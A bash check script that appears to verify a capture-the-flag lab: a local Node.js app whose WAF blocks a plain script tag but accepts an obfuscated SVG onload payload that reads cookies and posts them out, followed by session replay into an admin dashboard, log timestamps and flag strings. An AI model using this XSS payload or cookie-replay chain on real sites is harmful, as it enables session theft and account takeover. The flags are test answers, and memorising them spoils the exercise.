#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE_URL:-http://127.0.0.1:3075}"
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

pass=0
fail=0

check() {
  local name="$1"
  shift
  if "$@"; then
    printf '[PASS] %s\n' "$name"
    pass=$((pass+1))
  else
    printf '[FAIL] %s\n' "$name"
    fail=$((fail+1))
  fi
}

curl -fsS -D "$TMP" "$BASE/" -o /dev/null
check "HTTP 3075 reachable" test -s "$TMP"
check "X-Powered-By Node.js" grep -qi '^X-Powered-By: Node.js' "$TMP"

curl -fsS "$BASE/robots.txt" | grep -q '/api/verify-mfa'
check "robots.txt exposes MFA endpoint" true

curl -fsS -c "$TMP.cookies" "$BASE/" -o /dev/null
check "pre_mfa_session cookie exists" grep -q 'pre_mfa_session.*pending_mfa_verification' "$TMP.cookies"

status="$(curl -sS -o /dev/null -w '%{http_code}' \
  -X POST "$BASE/feedback" \
  --data-urlencode 'message=<script>alert(1)</script>')"
check "standard script payload blocked with 403" test "$status" = "403"

svg='<svg onload="fetch('\''/api/telemetry'\'',{method:'\''POST'\'',headers:{'\''Content-Type'\'':'\''application/json'\''},body:JSON.stringify({cookie:window['\''docu'\''+'\''ment'\'']['\''coo'\''+'\''kie'\'']})})"></svg>'
status="$(curl -sS -o /dev/null -w '%{http_code}' \
  -X POST "$BASE/feedback" \
  --data-urlencode "message=$svg")"
check "SVG payload accepted" test "$status" = "201"


status="$(curl -sS -o /dev/null -w '%{http_code}' \
  -b "$TMP.cookies" \
  "$BASE/api/session/replay" \
  -c "$TMP.admincookies")"
check "stolen cookie replay returns 200" test "$status" = "200"
check "adm_sess cookie issued" grep -q 'adm_sess' "$TMP.admincookies"

curl -fsS -b "$TMP.admincookies" "$BASE/dashboard" | grep -q 'Restricted Admin Dashboard'
check "dashboard accessible with replayed admin cookie" true

check "access log exists" test -f /opt/admin/logs/access.log
check "error log exists" test -f /opt/admin/logs/error.log
check "first WAF block timestamp" grep -q '18:50:15.*<script>' /opt/admin/logs/error.log
check "successful dashboard timestamp" grep -q '18:51:55.*GET /dashboard.*200' /opt/admin/logs/access.log
check "authentication anomaly timestamp" grep -q '18:53:10.*Authentication bypass anomaly' /opt/admin/logs/error.log
check "Blue Base64 marker" grep -q 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}' /opt/admin/logs/access.log
check "Red flag" grep -q 'RED_C00k13_MFA_Byp4ss_0wn3d' /opt/scenario75/app/src/server.js

echo
echo "Passed: $pass"
echo "Failed: $fail"

(( fail == 0 ))
